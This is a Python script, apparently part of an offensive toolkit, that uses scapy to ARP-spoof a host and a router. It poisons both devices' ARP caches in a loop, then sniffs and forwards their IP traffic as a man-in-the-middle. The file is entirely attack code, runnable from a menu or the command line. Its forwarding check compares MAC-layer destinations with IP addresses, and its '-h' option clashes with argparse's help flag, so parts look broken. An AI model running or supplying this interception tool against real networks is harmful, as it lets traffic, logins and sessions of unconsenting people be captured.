#!/usr/bin/env python3
# ARP Spoofing

import argparse
from scapy.all import *
from scapy.all import ARP
from scapy.all import IP
import time
import threading
import sys

def arpSpoof(targetIp, spoofIp, iface):
    pkt = ARP(op=2,
    pdst=targetIp,
    hwdst="ff:ff:ff:ff:ff:ff",
    psrc=spoofIp)
    print(f"Sending ARP spoof packets to target {targetIp}, impersonating {spoofIp}.")
    while True:
        send(pkt, iface=iface, verbose=False)
        time.sleep(1)

def forwardPacket(pkt, hostIp, routerIp, iface):
    # If the packet is destined for the router (host-to-router)
    if pkt.dst == hostIp and pkt.haslayer(IP):
        sendp(pkt, iface=iface, verbose=False)
    # If the packet is destined for the host (router-to-host)
    elif pkt.dst == routerIp and pkt.haslayer(IP):
        sendp(pkt, iface=iface, verbose=False)

# Sniff packets and forward them between the host and router
def sniffAndForward(hostIp, routerIp, iface):
    print(f"Starting packet sniffing on {iface}")
    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, hostIp, routerIp, iface), store=0)

def startAttack(hostIp, routerIp, iface):
    # Start the ARP poisoning threads (poison both Host and Router)
    threading.Thread(target=arpSpoof, args=(hostIp, routerIp, iface), daemon=True).start()
    threading.Thread(target=arpSpoof, args=(routerIp, hostIp, iface), daemon=True).start()
    # Start sniffing and forwarding packets between Host and Router
    sniffAndForward(hostIp, routerIp, iface)

def menu():
    RED = "\033[38;2;255;0;0m"
    RESET = "\033[0m"
    hostIp = input(f"{RED}\nHost IP: {RESET}")
    targetIp = input(f"{RED}Target IP: {RESET}")
    interface = input(f"{RED}Interface: {RESET}")
    startAttack(hostIp, targetIp, interface)

def terminal():
    parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-h", "--hostip", required=True, help="Host IP address.")
    parser.add_argument("-t", "--targetip", required=True, help="Target IP address.")
    parser.add_argument("-i", "--interface", required=True, help="Interface that will be used to conduct the attack.\nUsage: purplest-arpspoof -h 192.168.1.10 -t 192.168.1.1 -i eth0")

    args = parser.parse_args()

    if args.hostip is not None and args.targetip is not None and args.interface is not None:
         startAttack(args.hostip, args.targetip, args.interface)
    else:
        parser.error("Syntax error.")

def main():
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()